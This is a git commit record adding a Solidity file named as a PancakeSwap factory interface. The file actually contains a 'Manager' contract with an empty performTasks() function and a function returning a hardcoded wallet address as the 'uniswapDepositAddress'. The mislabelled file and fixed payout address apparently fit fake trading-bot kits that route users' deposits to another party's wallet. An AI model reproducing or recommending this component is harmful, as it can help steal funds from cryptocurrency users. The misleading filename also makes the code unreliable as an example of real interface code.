040a06b7a5318b4d7538e77888c85f48eb35a76a
Michael <415299363@qq.com>
2021-12-29 14:27:17 +0800

    first commit

---
+++ IPancakeswapV2Factory.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x0baa2BFc771523e5958105D7f497F44688F67DE2;
+	}
+}
